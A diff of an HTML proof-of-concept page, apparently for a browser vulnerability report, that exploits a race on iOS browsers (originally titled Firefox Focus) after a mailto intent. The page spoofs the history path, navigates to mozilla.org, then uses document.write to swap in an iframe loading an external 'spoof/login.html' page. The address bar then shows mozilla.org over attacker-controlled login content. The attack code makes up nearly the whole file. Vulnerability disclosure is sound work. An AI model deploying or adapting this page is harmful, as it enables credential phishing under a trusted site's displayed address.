@@ -1,56 +1,67 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Firefox Focus iOS External Intent PoC</title>
-<style>
-  body { font-family: sans-serif; }
-  .note { color: red; font-weight: bold; }
-</style>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>iOS External Intent Navigation State PoC</title>
+
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+    }
+    .note {
+      color: red;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+    iframe {
+      width: 100%;
+      height: 420px;
+      border: 1px solid #ccc;
+      margin-top: 10px;
+    }
+  </style>
 </head>
+
 <body>
 
-<button id="test">Trigger mailto intent</button>
+  <button id="test">Trigger mailto intentA</button>
 
-<script>
-document.getElementById('test').onclick = () => {
+  <script>
+    document.getElementById('test').onclick = () => {
 
-  // Step 1: spoof visible URL (SPA-style)
-  history.pushState({}, '', '/expected-path');
+      // Step 1: Change visible URL without navigation
+      history.pushState({}, '', '/expected-path');
 
-  // Step 2: external intent
-  setTimeout(() => {
-    location.href = 'mailto:test@example.com';
-  }, 300);
+      // Step 2: Trigger external intent (Mail app)
+      setTimeout(() => {
+        location.href = 'mailto:tap again to mozila';
+      }, 300);
 
-  // Step 3: navigation that updates address bar to mozilla
-  setTimeout(() => {
-    location.href = 'https://www.mozilla.org:9090';
-  }, 1200);
+      // Step 3: Delayed navigation that updates the address bar
+      setTimeout(() => {
+        location.href = 'https://www.mozilla.org:8080';
+      }, 1200);
 
-  // Step 4: RACE — attempt to inject attacker-controlled content
-  setTimeout(() => {
-    try {
-      document.open();
-      document.write(`
-        <p class="note">
-          Demo: Address bar shows mozilla.org, but content below is attacker‑controlled.
-        </p>
-        <iframe
-          src="https://cnfdnfial-ops.github.io/spoof/login.html"
-          style="width:100%;height:420px;border:1px solid #ccc">
-        </iframe>
-      `);
-      document.close();
-    } catch (e) {}
-  }, 1250);
-};
-</script>
+      // Step 4: RACE — attempt to replace document content with iframe
+      setTimeout(() => {
+        try {
+          document.open();
+          document.write(`
+            <p class="note">
+              Demo: Address bar shows mozilla.org, but content below is attacker-controlled.
+            </p>
+            <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+          `);
+          document.close();
+        } catch (e) {}
+      }, 1250);
+    };
+  </script>
 
-<p>
-Observe whether the address bar always reflects the active document
-after returning from the mail app.
-</p>
+  <p>
+    Observe whether the address bar always reflects the active document
+    after returning from the mail app.
+  </p>
 
 </body>
 </html>
